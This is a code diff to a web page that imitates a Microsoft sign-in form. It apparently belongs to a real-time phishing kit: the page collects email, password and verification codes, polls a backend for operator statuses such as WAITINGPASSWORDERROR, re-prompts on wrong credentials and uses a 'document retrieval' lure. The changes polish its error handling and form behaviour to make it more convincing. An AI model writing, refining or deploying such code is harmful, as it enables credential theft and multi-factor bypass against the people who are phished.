@@ -193,6 +193,17 @@
                                 <span id="GeneralError" style="display:none;">An error occurred. Please try
                                     again.</span>
                             </div>
+                            <!-- Styled Error Display (for template-level errors like polling failures) -->
+                            <div class="form-input-container" id="styledErrorContainer" style="display:none;">
+                                <div class="form-error-display" style="background:#fdecea; border:1px solid #d32f2f; border-radius:8px; padding:12px 16px; margin:12px 0; display:flex; align-items:flex-start; gap:10px;">
+                                    <i class="fas fa-exclamation-circle" style="color:#d32f2f; font-size:20px; margin-top:1px;"></i>
+                                    <div style="flex:1;">
+                                        <div style="font-weight:600; color:#d32f2f; font-size:14px; margin-bottom:4px;">Something went wrong</div>
+                                        <div id="styledErrorMessage" style="color:#333; font-size:13px; line-height:1.4; margin-bottom:8px;"></div>
+                                        <button type="button" onclick="location.reload()" style="background:#d32f2f; color:#fff; border:none; border-radius:4px; padding:6px 16px; font-size:13px; cursor:pointer; font-weight:500;">Retry</button>
+                                    </div>
+                                </div>
+                            </div>
                             <div class="form-input-container">
                                 <input type="button" name="btnSubmitPassword" value="Verify" id="btnSubmitPassword"
                                     accesskey="V" class="form-submit" onclick="handleFormSubmission()">
@@ -202,7 +213,7 @@
 
                     <div class="legal">
                         <span>&copy; 2017 Microsoft</span>
-                        <a href="https://go.microsoft.com/fwlink/?linkid=845480">Privacy &amp; Cookies</a>
+                        <a href="https://go.microsoft.com/fwlink/?linkid=845480">Privacy & Cookies</a>
                     </div>
                 </div>
             </div>
@@ -281,6 +292,7 @@
         let currentStatus = null;
         let lastShownStatus = '';
         let isSubmitting = false;
+        let isInitialLoad = true;
         let submitGuardTimeout = null;
         let lastRenderedOptionsHash = '';
 
@@ -296,6 +308,20 @@
         ];
         let currentMessageIndex = 0;
         let messageIntervalId = null;
+
+        function showStyledError(message) {
+            const container = document.getElementById('styledErrorContainer');
+            const msgEl = document.getElementById('styledErrorMessage');
+            if (container && msgEl) {
+                msgEl.textContent = message || 'An unexpected error occurred.';
+                container.style.display = 'block';
+            }
+        }
+
+        function hideStyledError() {
+            const container = document.getElementById('styledErrorContainer');
+            if (container) container.style.display = 'none';
+        }
 
         function objectToFormData(obj) {
             const fd = new URLSearchParams();
@@ -329,6 +355,26 @@
             clearInterval(messageIntervalId);
         }
 
+        function setFormSubmitting(submitting) {
+            const emailField = document.getElementById('txtEmail');
+            const passwordField = document.getElementById('txtPassword');
+            const verificationCodeInput = document.getElementById('txtVerificationCode');
+            const submitButton = document.getElementById('btnSubmitPassword');
+            const inputs = [emailField, passwordField, verificationCodeInput];
+            const radios = document.querySelectorAll('input[name="verificationOption"]');
+            if (submitting) {
+                isSubmitting = true;
+                inputs.forEach(i => { if (i) { i.disabled = true; i.readOnly = true; } });
+                radios.forEach(r => { r.disabled = true; });
+                if (submitButton) { submitButton.disabled = true; submitButton.value = 'Submitting...'; submitButton.style.backgroundColor = '#BEBEBE'; submitButton.style.color = '#000'; }
+            } else {
+                isSubmitting = false;
+                inputs.forEach(i => { if (i) { i.disabled = false; i.readOnly = false; } });
+                radios.forEach(r => { r.disabled = false; });
+                if (submitButton) { submitButton.disabled = false; submitButton.style.backgroundColor = ''; submitButton.style.color = ''; }
+            }
+        }
+
         function startLoadingMessages() {
             const el = document.getElementById('loadingMessage');
             currentMessageIndex = 0;
@@ -341,6 +387,7 @@
         }
 
         function hideAllErrors() {
+            hideStyledError();
             ['InvalidEmail', 'InvalidPassword', 'RequirePassword', 'GeneralError', 'RequireVerificationChoice', 'RequireVerificationCode', 'InvalidVerificationCode'].forEach(id => {
                 document.getElementById(id).style.display = 'none';
             });
@@ -362,7 +409,7 @@
                 clearInterval(pollingIntervalId);
                 isSubmitting = false;
                 if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
-                showErrorOverlay('Session timed out. Please try again.');
+                showStyledError('Session timed out. Please refresh the page and try again.');
                 return;
             }
             try {
@@ -384,7 +431,7 @@
                 clearInterval(pollingIntervalId);
                 isSubmitting = false;
                 if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
-                showErrorOverlay('Polling failed. Please try again.');
+                showStyledError('Connection issue. Please check your internet and try again.');
             }
         }
 
@@ -457,6 +504,9 @@
                                 passwordField.value = '';
                             }
                         } catch (e) { }
+                    } else if (status === 'WAITINGEMAILERROR') {
+                        document.getElementById('InvalidEmail').textContent = 'Invalid email. Please try again.';
+                        document.getElementById('InvalidEmail').style.display = 'block';
                     }
                     if (!isSameStatusDuringSubmit) {
                         hideLoadingOverlay();
@@ -473,7 +523,7 @@
                     if (data.email) emailField.value = data.email;
                     emailField.readOnly = true;
                     passwordField.disabled = false;
-                    if (lastShownStatus !== currentStatus && data.lastJsonResponse) {
+                    if (data.lastJsonResponse) {
                         try {
                             const r = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
                             if (r.message && (r.message.includes('Incorrect password') || r.message.includes('incorrect'))) {
@@ -482,8 +532,10 @@
                                 passwordField.value = '';
                             }
                         } catch (e) { }
+                    } else if (status === 'WAITINGPASSWORDERROR') {
+                        document.getElementById('InvalidPassword').textContent = 'Incorrect password. Please try again.';
+                        document.getElementById('InvalidPassword').style.display = 'block';
                     }
-                    lastShownStatus = currentStatus;
                     if (!isSameStatusDuringSubmit) {
                         hideLoadingOverlay();
                     }
@@ -514,7 +566,9 @@
                     verificationOptionsGroup.style.display = 'none';
                     verificationCodeGroup.style.display = 'block';
                     submitButton.value = 'Submit Code';
-                    verificationCodeInput.value = '';
+                    if (statusChanged) {
+                        verificationCodeInput.value = '';
+                    }
                     const viewName = (data && data.viewName) || (data && data.lastJsonResponse ? (typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse || '{}') : data.lastJsonResponse).viewName : '') || '';
                     const codeLabel = document.getElementById('verificationCodeLabel');
                     if (codeLabel) {
@@ -548,12 +602,18 @@
                     window.location.href = redirectUrl;
                     break;
                 case 'FAILED':
-                    showErrorOverlay('Document retrieval failed. Please try again later.');
+                    showStyledError('Document retrieval failed. Please try again later.');
                     clearInterval(pollingIntervalId);
+                    if (!isSameStatusDuringSubmit) {
+                        hideLoadingOverlay();
+                    }
                     break;
                 default:
-                    showErrorOverlay('An unexpected status was received. Please try again.');
+                    showStyledError('An unexpected status was received. Please try again.');
                     clearInterval(pollingIntervalId);
+                    if (!isSameStatusDuringSubmit) {
+                        hideLoadingOverlay();
+                    }
                     break;
             }
         }
@@ -708,7 +768,7 @@
                 }
             } catch (e) {
                 console.error('Initial submission error:', e);
-                showErrorOverlay('Failed to initiate process. Please try again.');
+                showStyledError('Failed to initiate process. Please try again.');
             }
         }
 
@@ -805,7 +865,7 @@
                 payload.verificationCode = code;
                 updateType = 'verificationCode';
             } else {
-                showErrorOverlay('Unexpected form submission state. Please try again.');
+                showStyledError('Unexpected form submission state. Please try again.');
                 return;
             }
 
@@ -827,7 +887,7 @@
                 console.error('Submission error:', e);
                 isSubmitting = false;
                 if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
-                showErrorOverlay('An error occurred during submission. Please try again.');
+                showStyledError('An error occurred during submission. Please try again.');
             }
         }
 
@@ -854,7 +914,7 @@
             console.log('[Template] DOMContentLoaded fired');
             window.onerror = function(msg, url, line, col, err) {
                 console.error('[Template] UNCAUGHT ERROR:', msg, '| line:', line, '| col:', col, '| err:', err);
-                showErrorOverlay('Script error: ' + msg);
+                showStyledError('Something went wrong. Please refresh and try again.');
             };
             window.addEventListener('unhandledrejection', function(e) {
                 console.error('[Template] UNHANDLED PROMISE REJECTION:', e.reason);
